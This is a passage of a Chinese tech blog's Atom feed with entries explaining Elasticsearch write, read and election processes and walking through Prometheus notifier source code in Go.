        &lt;h3 id=&quot;kubernetes-debug环境搭建&quot;&gt;&lt;a href=&quot;#kubernetes-debug环境搭建&quot; class=&quot;headerlink&quot; title=&quot;kubernetes debug环境搭建&quot;&gt;&lt;/a&gt;kubernetes debug环境搭建&lt;/h3&gt;&lt;
      
    
    </summary>
    
    
      <category term="k8s" scheme="http://www.yorzorzy.xyz/categories/k8s/"/>
    
    
      <category term="k8s" scheme="http://www.yorzorzy.xyz/tags/k8s/"/>
    
  </entry>
  
  <entry>
    <title>ES过程分析</title>
    <link href="http://www.yorzorzy.xyz/2020/02/26/es%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/"/>
    <id>http://www.yorzorzy.xyz/2020/02/26/es%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/</id>
    <published>2020-02-26T12:51:46.449Z</published>
    <updated>2020-02-26T12:50:21.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ES过程分析"><a href="#ES过程分析" class="headerlink" title="ES过程分析"></a>ES过程分析</h2><h3 id="选主算法"><a href="#选主算法" class="headerlink" title="选主算法"></a>选主算法</h3><p>Bully算法</p><p>他假设所有节点都有一个唯一的ID，使用该ID对节点进行排序。任何时候的当前Leader都是集群的最高ID节点。ES通过推迟选举，知道当前的Master失效来解决这个问题，只要当前节点不挂掉，就不重新选主。但容易出现脑裂，为此，再通过得票人数过半来解决脑裂问题。</p><p>Paxos算法</p><h3 id="数据副本策略"><a href="#数据副本策略" class="headerlink" title="数据副本策略"></a>数据副本策略</h3><p>分片副本采用主从模式。多副本中存在一个主副本Primary和多个从副本Secondary。所有写入操作都写入到主副本，当主副本出错的时候，系统从其他的从副本中选择合适的副本作为新的副本。</p><p>数据写入流程：</p><p>1）写请求进入主副本节点，节点为该操作分配SN，使用该SN创建UpdateRequest结构。然后将该UpdateRequest插入自己的PrepareList</p><p>2）主副本节点将携带SN的UpdateRequest发往从副本节点，从节点收到后同样插入PrepareList，完成后给主副本节点回复一个ACK</p><p>3）一旦主副本节点收到所有从副本节点的相应，确定该数据已经被正确写入到所有的从副本节点，此时认为可以提交了，将此UpdateRequest放入到commited list， commited list向前移动。</p><p>4）主副本节点回复客户端更新成功完成。对每个prepare消息，主副本节点向从副本节点发送一个commit通知，告诉他们自己的commited point位置，从副本节点收到通知后根据指示移动commited point到相同的位置。</p><h3 id="基本读取模型"><a href="#基本读取模型" class="headerlink" title="基本读取模型"></a>基本读取模型</h3><p>1）读请求转发到相关分片。注意，因为大多数搜索都会发送到一个或者多个索引，通常需要从多个分片中读取。每个分片都保存这些数据的一部分。</p><p>2）从副本组中选择一个相关分片的活跃副本，它可以是主分片或副分片。默认情况下，ES会简单地循环遍历这些分片</p><p>3）发送分片级的读请求到被选中的副本</p><p>4）合并结果并给客户端返回响应，注意，针对通过ID查找的get请求，会跳过这个步骤，因为只有一个相关的分片。</p><h3 id="Index基本流程"><a href="#Index基本流程" class="headerlink" title="Index基本流程"></a>Index基本流程</h3><p>新建，索引和删除请求都是写操作。写操作必须先在主分片执行成功后才能复制到相关的副分片。写单个文档的流程。</p><p>1）客户端向NODE1发送写请求</p><p>2）NODE1使用文档ID来确定文档属于分片0，通过集群状态中的内容路由表信息来获知分片0的主分片位于NODE3，因此请求被转发到NODE3上</p><p>3）NODE3上的主分片执行写操作，如果写入成功，则它将请求并行转发到NODE1和NODE2的副分片上，等待返回结果。当所有的副分片都报告成功，NODE3将向协调节点报告成功，协调节点再想客户端报告成功。</p><p>quorum = int( (primary+number_of_replicas)/2)+1</p><h3 id="协调节点流程"><a href="#协调节点流程" class="headerlink" title="协调节点流程"></a>协调节点流程</h3><p>协调节点负责创建索引，转发请求到主分片节点，等待响应，回复客户端。</p><p>1）参数检查</p><p>2）处理pipeline请求</p><p>3）自动创建索引</p><p>4）对请求的预先处理</p><p>5）检测集群状态</p><p>6）内容路由，构建基于shared的请求</p><p>7）路由算法</p><p>8）转发请求并等待响应</p><h3 id="主分片节点流程"><a href="#主分片节点流程" class="headerlink" title="主分片节点流程"></a>主分片节点流程</h3><p>主节点所在节点负责在本地写主分片，写成功后，转发写副分片请求，等待响应，回复协调节点。</p><p>1）检查请求</p><p>2）是否延迟执行</p><p>3）判断主分片是否已经发生迁移</p><p>4）检查写一致性</p><p>5）写Lucene和事务日志</p><p>6）flush translog</p><p>7）写副分片</p><p>8）处理副分片写失败情况</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ES过程分析&quot;&gt;&lt;a href=&quot;#ES过程分析&quot; class=&quot;headerlink&quot; title=&quot;ES过程分析&quot;&gt;&lt;/a&gt;ES过程分析&lt;/h2&gt;&lt;h3 id=&quot;选主算法&quot;&gt;&lt;a href=&quot;#选主算法&quot; class=&quot;headerlink&quot; title=&quot;选
      
    
    </summary>
    
    
      <category term="ElasticSearch" scheme="http://www.yorzorzy.xyz/categories/ElasticSearch/"/>
    
    
      <category term="ElasticSearch" scheme="http://www.yorzorzy.xyz/tags/ElasticSearch/"/>
    
  </entry>
  
  <entry>
    <title>Prometheus 架构和源码学习</title>
    <link href="http://www.yorzorzy.xyz/2020/02/18/prometheus%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D/"/>
    <id>http://www.yorzorzy.xyz/2020/02/18/prometheus%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D/</id>
    <published>2020-02-18T01:29:10.643Z</published>
    <updated>2020-02-18T01:29:10.643Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Prometheus-架构和源码"><a href="#Prometheus-架构和源码" class="headerlink" title="Prometheus 架构和源码"></a>Prometheus 架构和源码</h1><h2 id="Prometheus架构"><a href="#Prometheus架构" class="headerlink" title="Prometheus架构"></a>Prometheus架构</h2><p><img src="http://www.aneasystone.com/usr/uploads/2018/10/4197609471.png" alt="architecture.png"></p><h2 id="构成部分"><a href="#构成部分" class="headerlink" title="构成部分"></a>构成部分</h2><p>prometheus源码分析（prometheus基于版本2.1.0和alertmanager版本0.8.0）：</p><ol><li>notifier</li><li>ruleManager</li><li>queryengine</li><li>web</li><li>discovermanager</li><li>scrapeManager</li><li>localstorage/remotestorage</li><li>alertManager</li><li>pushgateway</li></ol><p>各个组件的构成结构图：</p><p><img src="/images/1572413613743.png" alt="1572413613743"></p><h2 id="Notifier"><a href="#Notifier" class="headerlink" title="Notifier"></a>Notifier</h2><p>notifier 组件用于告警通知，在完成初始化后，notifier组件内部会构建一个告警通知队列，队列的大小由命令行参数–alertmanager.notification-queue-capacity确定，默认值为10000 ，且告警信息通过sendAlerts方法发送给AlertManager 。</p><p>初始化notifier组件：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notifier               = notifier.New(&amp;cfg.notifier, log.With(logger, <span class="string">"component"</span>, <span class="string">"notifier"</span>))</span><br></pre></td></tr></table></figure><p>notifier将规则触发的告警信息AlertManagers服务组的过程，通知管理服务由发现AlertManager服务，注册notifier和notifier服务组成。</p><p>发现alertManager服务（discoveryManagerScrape）的逻辑与发现scrape服务（discoveryManagerNotify）的逻辑是一样的，</p><p>如果将alertmanager组件结合，那么服务发现的类型就是static_configs</p><p>初始化的过程中会完成对rulemanager和notifier组件的构造，同时notifier会通过sendAlerts向ruleManager回调注册。</p><p>启动notifier服务：</p><p>1.构建notifier结构实列</p><p>2.加载系统配置</p><p>3.启动notifier</p><p>notifier服务结构：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Notifier is responsible for dispatching alert notifications to an</span></span><br><span class="line"><span class="comment">// alert manager service.</span></span><br><span class="line"><span class="keyword">type</span> Notifier <span class="keyword">struct</span> &#123;</span><br><span class="line">queue []*Alert</span><br><span class="line">opts  *Options</span><br><span class="line"></span><br><span class="line">metrics *alertMetrics</span><br><span class="line"></span><br><span class="line">more   <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">mtx    sync.RWMutex</span><br><span class="line">ctx    context.Context</span><br><span class="line">cancel <span class="function"><span class="keyword">func</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line">alertmanagers <span class="keyword">map</span>[<span class="keyword">string</span>]*alertmanagerSet</span><br><span class="line">logger        log.Logger</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>notifier实列使用New方法来实现，处理逻辑：</p><ol><li>QueueCapacity的大小构建告警信息缓存队列，QueueCapacity的大小使用命令行启动参数–alertmanager.notification-queue-capacity指定</li><li>context协同控制notifier服务</li><li>注册notifier服务指标：告警缓存队列大小，告警信息长度，告警地址个书，丢弃的告警信息个数</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// New constructs a new Notifier.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(o *Options, logger log.Logger)</span> *<span class="title">Notifier</span></span> &#123;</span><br><span class="line">ctx, cancel := context.WithCancel(context.Background())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> o.Do == <span class="literal">nil</span> &#123;</span><br><span class="line">o.Do = ctxhttp.Do</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> logger == <span class="literal">nil</span> &#123;</span><br><span class="line">logger = log.NewNopLogger()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">n := &amp;Notifier&#123;</span><br><span class="line">queue:  <span class="built_in">make</span>([]*Alert, <span class="number">0</span>, o.QueueCapacity),</span><br><span class="line">ctx:    ctx,</span><br><span class="line">cancel: cancel,</span><br><span class="line">more:   <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;, <span class="number">1</span>),</span><br><span class="line">opts:   o,</span><br><span class="line">logger: logger,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">queueLenFunc := <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">float64</span></span> &#123; <span class="keyword">return</span> <span class="keyword">float64</span>(n.queueLen()) &#125;</span><br><span class="line">alertmanagersDiscoveredFunc := <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">float64</span></span> &#123; <span class="keyword">return</span> <span class="keyword">float64</span>(<span class="built_in">len</span>(n.Alertmanagers())) &#125;</span><br><span class="line"></span><br><span class="line">n.metrics = newAlertMetrics(</span><br><span class="line">o.Registerer,</span><br><span class="line">o.QueueCapacity,</span><br><span class="line">queueLenFunc,</span><br><span class="line">alertmanagersDiscoveredFunc,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> n</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>newAlertMetrics是将notifier服务指标注册到prometheus系统的具体实现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newAlertMetrics</span><span class="params">(r prometheus.Registerer, queueCap <span class="keyword">int</span>, queueLen, alertmanagersDiscovered <span class="keyword">func</span>()</span> <span class="title">float64</span>) *<span class="title">alertMetrics</span></span> &#123;</span><br><span class="line">m := &amp;alertMetrics&#123;</span><br><span class="line">latency: prometheus.NewSummaryVec(prometheus.SummaryOpts&#123;</span><br><span class="line">Namespace: namespace,</span><br><span class="line">Subsystem: subsystem,</span><br><span class="line">Name:      <span class="string">"latency_seconds"</span>,</span><br><span class="line">Help:      <span class="string">"Latency quantiles for sending alert notifications (not including dropped notifications)."</span>,</span><br><span class="line">&#125;,</span><br><span class="line">[]<span class="keyword">string</span>&#123;alertmanagerLabel&#125;,</span><br><span class="line">),</span><br><span class="line">errors: prometheus.NewCounterVec(prometheus.CounterOpts&#123;</span><br><span class="line">Namespace: namespace,</span><br><span class="line">Subsystem: subsystem,</span><br><span class="line">Name:      <span class="string">"errors_total"</span>,</span><br><span class="line">Help:      <span class="string">"Total number of errors sending alert notifications."</span>,</span><br><span class="line">&#125;,</span><br><span class="line">[]<span class="keyword">string</span>&#123;alertmanagerLabel&#125;,</span><br><span class="line">),</span><br><span class="line">sent: prometheus.NewCounterVec(prometheus.CounterOpts&#123;</span><br><span class="line">Namespace: namespace,</span><br><span class="line">Subsystem: subsystem,</span><br><span class="line">Name:      <span class="string">"sent_total"</span>,</span><br><span class="line">Help:      <span class="string">"Total number of alerts successfully sent."</span>,</span><br><span class="line">&#125;,</span><br><span class="line">[]<span class="keyword">string</span>&#123;alertmanagerLabel&#125;,</span><br><span class="line">),</span><br><span class="line">dropped: prometheus.NewCounter(prometheus.CounterOpts&#123;</span><br><span class="line">Namespace: namespace,</span><br><span class="line">Subsystem: subsystem,</span><br><span class="line">Name:      <span class="string">"dropped_total"</span>,</span><br><span class="line">Help:      <span class="string">"Total number of alerts dropped due to errors when sending to Alertmanager."</span>,</span><br><span class="line">&#125;),</span><br><span class="line">queueLength: prometheus.NewGaugeFunc(prometheus.GaugeOpts&#123;</span><br><span class="line">Namespace: namespace,</span><br><span class="line">Subsystem: subsystem,</span><br><span class="line">Name:      <span class="string">"queue_length"</span>,</span><br><span class="line">Help:      <span class="string">"The number of alert notifications in the queue."</span>,</span><br><span class="line">&#125;, queueLen),</span><br><span class="line">queueCapacity: prometheus.NewGauge(prometheus.GaugeOpts&#123;</span><br><span class="line">Namespace: namespace,</span><br><span class="line">Subsystem: subsystem,</span><br><span class="line">Name:      <span class="string">"queue_capacity"</span>,</span><br><span class="line">Help:      <span class="string">"The capacity of the alert notifications queue."</span>,</span><br><span class="line">&#125;),</span><br><span class="line">alertmanagersDiscovered: prometheus.NewGaugeFunc(prometheus.GaugeOpts&#123;</span><br><span class="line">Name: <span class="string">"prometheus_notifications_alertmanagers_discovered"</span>,</span><br><span class="line">Help: <span class="string">"The number of alertmanagers discovered and active."</span>,</span><br><span class="line">&#125;, alertmanagersDiscovered),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">m.queueCapacity.Set(<span class="keyword">float64</span>(queueCap))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> r != <span class="literal">nil</span> &#123;</span><br><span class="line">r.MustRegister(</span><br><span class="line">m.latency,</span><br><span class="line">m.errors,</span><br><span class="line">m.sent,</span><br><span class="line">m.dropped,</span><br><span class="line">m.queueLength,</span><br><span class="line">m.queueCapacity,</span><br><span class="line">m.alertmanagersDiscovered,</span><br><span class="line">)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> m</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加载服务配置：</p><p>加载系统的配置过程，notifier服务会从prometheus.yml中获取external_labels, alert_relabel_configs和告警服务配置信息，将其保存到alertmanager中，告警触发的时候，根据external_labels,alert_relabel_configs的规则添加，重置对应的label，更具告警服务信息完成告警的信息发送。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// ApplyConfig updates the status state as the new config requires.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *Notifier)</span> <span class="title">ApplyConfig</span><span class="params">(conf *config.Config)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">n.mtx.Lock()</span><br><span class="line"><span class="keyword">defer</span> n.mtx.Unlock()</span><br><span class="line"></span><br><span class="line">n.opts.ExternalLabels = conf.GlobalConfig.ExternalLabels</span><br><span class="line">n.opts.RelabelConfigs = conf.AlertingConfig.AlertRelabelConfigs</span><br><span class="line"></span><br><span class="line">amSets := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]*alertmanagerSet)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, cfg := <span class="keyword">range</span> conf.AlertingConfig.AlertmanagerConfigs &#123;</span><br><span class="line">ams, err := newAlertmanagerSet(cfg, n.logger)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ams.metrics = n.metrics</span><br><span class="line"></span><br><span class="line"><span class="comment">// The config hash is used for the map lookup identifier.</span></span><br><span class="line">b, err := json.Marshal(cfg)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">amSets[fmt.Sprintf(<span class="string">"%x"</span>, md5.Sum(b))] = ams</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">n.alertmanagers = amSets</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>newAlertmanagerSet方法会根据告警服务的配置信息构建alertmanagerSet结构实列，告警服务对应的ams还是初始化空列表</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// alertmanagerSet contains a set of Alertmanagers discovered via a group of service</span></span><br><span class="line"><span class="comment">// discovery definitions that have a common configuration on how alerts should be sent.</span></span><br><span class="line"><span class="keyword">type</span> alertmanagerSet <span class="keyword">struct</span> &#123;</span><br><span class="line">cfg    *config.AlertmanagerConfig</span><br><span class="line">client *http.Client</span><br><span class="line"></span><br><span class="line">metrics *alertMetrics</span><br><span class="line"></span><br><span class="line">mtx    sync.RWMutex</span><br><span class="line">ams    []alertmanager</span><br><span class="line">logger log.Logger</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newAlertmanagerSet</span><span class="params">(cfg *config.AlertmanagerConfig, logger log.Logger)</span> <span class="params">(*alertmanagerSet, error)</span></span> &#123;</span><br><span class="line">client, err := httputil.NewClientFromConfig(cfg.HTTPClientConfig, <span class="string">"alertmanager"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">s := &amp;alertmanagerSet&#123;</span><br><span class="line">client: client,</span><br><span class="line">cfg:    cfg,</span><br><span class="line">logger: logger,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> s, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动notifier服务：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Run dispatches notifications continuously.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *Notifier)</span> <span class="title">Run</span><span class="params">(tsets &lt;-<span class="keyword">chan</span> <span class="keyword">map</span>[<span class="keyword">string</span>][]*targetgroup.Group)</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-n.ctx.Done():</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> ts := &lt;-tsets:</span><br><span class="line">n.reload(ts)</span><br><span class="line"><span class="keyword">case</span> &lt;-n.more:</span><br><span class="line">&#125;</span><br><span class="line">alerts := n.nextBatch()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !n.sendAll(alerts...) &#123;</span><br><span class="line">n.metrics.dropped.Add(<span class="keyword">float64</span>(<span class="built_in">len</span>(alerts)))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// If the queue still has items left, kick off the next iteration.</span></span><br><span class="line"><span class="keyword">if</span> n.queueLen() &gt; <span class="number">0</span> &#123;</span><br><span class="line">n.setMore()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务收到更新信号调用reload方法，将告警服务ts放入reload方法中，更新服务目标服务信息。</p><p>scrape发现服务以job_name为单元，notifier发现服务以告警服务为单元，告警服务作用域所有的job_name.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *Notifier)</span> <span class="title">reload</span><span class="params">(tgs <span class="keyword">map</span>[<span class="keyword">string</span>][]*targetgroup.Group)</span></span> &#123;</span><br><span class="line">n.mtx.Lock()</span><br><span class="line"><span class="keyword">defer</span> n.mtx.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> id, tgroup := <span class="keyword">range</span> tgs &#123;</span><br><span class="line">am, ok := n.alertmanagers[id]</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">level.Error(n.logger).Log(<span class="string">"msg"</span>, <span class="string">"couldn't sync alert manager set"</span>, <span class="string">"err"</span>, fmt.Sprintf(<span class="string">"invalid id:%v"</span>, id))</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">am.sync(tgroup)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用sync方法，同步告警服务信息</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sync extracts a deduplicated set of Alertmanager endpoints from a list</span></span><br><span class="line"><span class="comment">// of target groups definitions.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *alertmanagerSet)</span> <span class="title">sync</span><span class="params">(tgs []*targetgroup.Group)</span></span> &#123;</span><br><span class="line">all := []alertmanager&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, tg := <span class="keyword">range</span> tgs &#123;</span><br><span class="line">ams, err := alertmanagerFromGroup(tg, s.cfg)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(s.logger).Log(<span class="string">"msg"</span>, <span class="string">"Creating discovered Alertmanagers failed"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">all = <span class="built_in">append</span>(all, ams...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s.mtx.Lock()</span><br><span class="line"><span class="keyword">defer</span> s.mtx.Unlock()</span><br><span class="line"><span class="comment">// Set new Alertmanagers and deduplicate them along their unique URL.</span></span><br><span class="line">s.ams = []alertmanager&#123;&#125;</span><br><span class="line">seen := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, am := <span class="keyword">range</span> all &#123;</span><br><span class="line">us := am.url().String()</span><br><span class="line"><span class="keyword">if</span> _, ok := seen[us]; ok &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This will initialise the Counters for the AM to 0.</span></span><br><span class="line">s.metrics.sent.WithLabelValues(us)</span><br><span class="line">s.metrics.errors.WithLabelValues(us)</span><br><span class="line"><span class="comment">//根据URL地址构建唯一键值，</span></span><br><span class="line">seen[us] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">        <span class="comment">//保存alertmanager</span></span><br><span class="line">s.ams = <span class="built_in">append</span>(s.ams, am)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>alertmanagerFromGroup 方法中将对告警信息的label 进行整理，包括<strong>address</strong>, <strong>alerts_path</strong> 和 <strong>scheme</strong>，每个实列的内容都为告警服务的URL地址。</p><p>sendAll方法，发送告警到所有配置的alertmanagers，当至少一个alertmanager成功，返回成功。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 